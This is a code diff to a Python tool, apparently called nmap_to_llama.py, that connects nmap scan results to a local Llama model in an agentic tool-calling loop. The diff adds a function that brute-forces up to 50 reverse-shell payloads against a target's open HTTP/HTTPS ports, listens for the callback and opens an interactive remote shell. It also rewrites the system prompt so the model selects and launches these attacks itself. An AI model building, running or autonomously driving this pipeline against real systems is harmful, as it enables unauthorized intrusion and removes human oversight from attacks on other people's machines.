@@ -8,6 +8,7 @@ Modified nmap_to_llama.py with RAG integration and tool calling support.
 - Send a concise prompt to local Ollama (Llama 3.1) with tool calling for analysis
 - Supports agentic loop for tool selection (e.g., query KB)
 - Added tools for payload generation, deployment, and reverse shell listening.
+- Modified try_multiple_payloads to deploy against the 3 most likely ports (open HTTP/HTTPS).
 """
 
 #chat transcript used: https://chatgpt.com/share/69041cad-5b04-8013-81df-2438c29ed0ca
@@ -63,7 +64,10 @@ collection.add(
     metadatas=metadatas
 )
 
-def query_kb(query: str, top_k: int = 3) -> str:
+# Global variable for nmap summary (set in main)
+global_summary = None
+
+def query_kb(query: str, top_k: int = 50) -> str:
     """Query the knowledge base for relevant payloads."""
     results = collection.query(
         query_embeddings=embedder.encode(query).tolist(),
@@ -247,6 +251,24 @@ TOOLS = [
                 "required": ["listener_port"]
             }
         }
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "try_multiple_payloads",
+            "description": "Try up to 50 most likely payloads on the 3 most likely ports until a reverse shell succeeds.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "os_type": {"type": "string", "description": "Target OS type for filtering payloads."},
+                    "listener_ip": {"type": "string", "description": "Listener IP."},
+                    "listener_port": {"type": "integer", "description": "Listener port."},
+                    "target_ip": {"type": "string", "description": "Target IP."},
+                    "endpoint": {"type": "string", "description": "Endpoint path (default '/exploit')."}
+                },
+                "required": ["os_type", "listener_ip", "listener_port", "target_ip"]
+            }
+        }
     }
 ]
 
@@ -388,8 +410,9 @@ Be concise and avoid full exploit instructions.
 
 def execute_tool(tool_call, user_os):
     """Execute the tool based on the call."""
-    function_name = tool_call["name"]
-    args = tool_call["arguments"]
+    function_name = tool_call.get("name")
+    args = tool_call.get("arguments", {})
+    print(f"Executing tool: {function_name} with args: {args}")  # Debug
     if function_name == "query_kb":
         query = args.get("query", "")
         top_k = args.get("top_k", 50)
@@ -404,6 +427,9 @@ def execute_tool(tool_call, user_os):
         os_type = args.get("os_type")
         listener_ip = args.get("listener_ip")
         listener_port = args.get("listener_port")
+        # Handle if listener_ip is like "get_attacker_ip()"
+        if isinstance(listener_ip, str) and "get_attacker_ip" in listener_ip:
+            listener_ip = get_local_ip(user_os)
         if not all([os_type, listener_ip, listener_port]):
             return "Missing required arguments."
         return generate_payload(os_type, listener_ip, listener_port)
@@ -419,42 +445,146 @@ def execute_tool(tool_call, user_os):
         if not listener_port:
             return "Missing listener_port."
         return start_listener(listener_port)
+    elif function_name == "try_multiple_payloads":
+        os_type = args.get("os_type")
+        listener_ip = args.get("listener_ip")
+        listener_port = args.get("listener_port")
+        target_ip = args.get("target_ip")
+        endpoint = args.get("endpoint", "/exploit")
+        if not all([os_type, listener_ip, listener_port, target_ip]):
+            return "Missing required arguments."
+        
+        # Get 3 most likely ports from global_summary (open HTTP/HTTPS)
+        if global_summary is None:
+            return "Nmap summary not available."
+        http_ports = [p['port'] for p in global_summary['ports'] if p['state'] == 'open' and (p['service'].get('name') in ['http', 'https'])]
+        if not http_ports:
+            return "No suitable HTTP/HTTPS ports found."
+        likely_ports = http_ports[:3]  # Top 3
+        
+        # Filter payloads based on os_type (up to 50)
+        filtered_sections = [s for s in reverse_shells["sections"] if os_type.lower() in s["OS"].lower()]
+        filtered_sections = filtered_sections[:50]  # Limit to 50
+        
+        if not filtered_sections:
+            return "No payloads found for the OS type."
+        
+        for port in likely_ports:
+            print(f"Trying payloads on port {port}...")
+            for idx, section in enumerate(filtered_sections):
+                payload_template = section['payload_info']['payload_template']
+                payload = payload_template.replace(reverse_shells['default_template_IP'], listener_ip).replace(reverse_shells['default_template_listening_port'], str(listener_port))
+                with open('current_payload.txt', 'w') as f:
+                    f.write(payload)
+                dep_result = deploy_payload(target_ip, port, endpoint)
+                # Listen with short timeout
+                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                server.bind(('0.0.0.0', listener_port))
+                server.listen(1)
+                server.settimeout(30)  # 30 sec timeout per try
+                try:
+                    conn, addr = server.accept()
+                    print(f"Success on port {port}, payload {idx+1} from {addr}. Entering interactive shell.")
+                    def interact(conn):
+                        while True:
+                            cmd = input("shell> ")
+                            if cmd.lower() == 'exit':
+                                break
+                            conn.send((cmd + '\n').encode())
+                            response = conn.recv(4096).decode(errors='ignore')
+                            print(response)
+                    interact(conn)
+                    conn.close()
+                    server.close()
+                    return f"Success on port {port}, payload {idx+1}. Deployment: {dep_result}"
+                except socket.timeout:
+                    server.close()
+                    print(f"Port {port}, payload {idx+1} failed. Trying next...")
+                except Exception as e:
+                    server.close()
+                    return f"Error on port {port}, payload {idx+1}: {str(e)}"
+        return "All payloads on all ports failed to establish a connection."
     return "Tool not found."
 
 def ask_llama_with_tools(prompt: str, user_os) -> str:
     """Send prompt to Ollama with tools and handle agentic loop."""
     messages = [
-        {"role": "system", "content": "You are an expert cybersecurity analyst. You have tools: query_kb for reverse shells KB, get_attacker_ip to get your IP, generate_payload to create and write payload, deploy_payload to send it to target, start_listener to open reverse shell listener. Use tools when appropriate."},
+        {"role": "system", "content": """You are an expert cybersecurity analyst. You have tools: query_kb for reverse shells KB, get_attacker_ip to get your IP, generate_payload to create and write payload, deploy_payload to send it to target, start_listener to open reverse shell listener, try_multiple_payloads to try up to 50 payloads on 3 most likely ports until success. Use tools when appropriate.
+When deciding to use a tool, structure your response with a "tool_calls" key containing a list of tool call objects. Each object should have:
+- "name": the tool name (string)
+- "arguments": a dict of argument names and values
+
+Use valid JSON values (strings, numbers) for arguments; do not include code like get_attacker_ip() – call the tool separately first if needed. For example, call get_attacker_ip first, then use the returned IP in generate_payload's listener_ip. Always use sequential calls for dependencies.
+
+Example response format for using tools (do not include this example in your output):
+{
+  "content": "Optional thinking or explanation here before tools.",
+  "tool_calls": [
+    {
+      "name": "query_kb",
+      "arguments": {
+        "query": "bash reverse shell",
+        "top_k": 5
+      }
+    },
+    {
+      "name": "deploy_payload",
+      "arguments": {
+        "target_ip": "10.200.1.41",
+        "target_port": 80
+      }
+    }
+  ]
+}
+
+Only use "content" for final answers without tools. For multi-step tasks, use tools sequentially in the agentic loop. Be precise with arguments based on tool descriptions."""},
         {"role": "user", "content": prompt},
     ]
     analysis = ""
-    max_iterations = 5  # Prevent infinite loops
+    max_iterations = 15  # Increased for more steps
 
-    for _ in range(max_iterations):
+    for iteration in range(max_iterations):
+        print(f"Agentic loop iteration {iteration + 1}")
         payload = {
             "model": MODEL,
             "messages": messages,
             "tools": TOOLS,
             "max_tokens": 800,
-            "temperature": 0.2,
+            "temperature": 0.7,  # Slightly higher for better format
         }
         resp = requests.post(OLLAMA_URL, json=payload, timeout=60)
         resp.raise_for_status()
         data = resp.json()
         response = data["choices"][0]["message"]
+        print("Raw LLM response:", response)  # Debug print
+
+        # If tool_calls not present, check if content is JSON with tool_calls
+        if "tool_calls" not in response:
+            content = response.get("content", "")
+            # Clean content: remove newlines, extra spaces, and replace invalid code with placeholder
+            cleaned_content = content.replace("\n", "").replace("\r", "").strip()
+            cleaned_content = re.sub(r'get_attacker_ip\(\)', '"<IP_PLACEHOLDER>"', cleaned_content)
+            if cleaned_content.startswith("{"):
+                try:
+                    parsed_content = json.loads(cleaned_content)
+                    if "tool_calls" in parsed_content:
+                        response["tool_calls"] = parsed_content["tool_calls"]
+                        print("Parsed tool_calls from cleaned content.")
+                except json.JSONDecodeError as e:
+                    print(f"JSON decode error: {e}")  # Debug
 
         if "tool_calls" in response:
             tool_calls = response["tool_calls"]
             messages.append(response)  # Add assistant's message
             for tool_call in tool_calls:
-                tool_result = execute_tool(tool_call["function"], user_os)
+                tool_result = execute_tool(tool_call, user_os)
                 messages.append({
                     "role": "tool",
                     "content": tool_result,
-                    "name": tool_call["function"]["name"]
+                    "name": tool_call.get("name")
                 })
         else:
-            analysis = response["content"]
+            analysis = response.get("content", "")
             break
 
     return analysis
@@ -491,8 +621,9 @@ def main():
         print("nmap failed:", e)
         sys.exit(1)
 
-    summary = parse_nmap_xml(xml)
-    prompt = build_prompt(summary, raw_xml=xml, max_chars=2000)
+    global global_summary
+    global_summary = parse_nmap_xml(xml)
+    prompt = build_prompt(global_summary, raw_xml=xml, max_chars=2000)
 
     print("Asking Llama to analyze results with tools...")
     try:
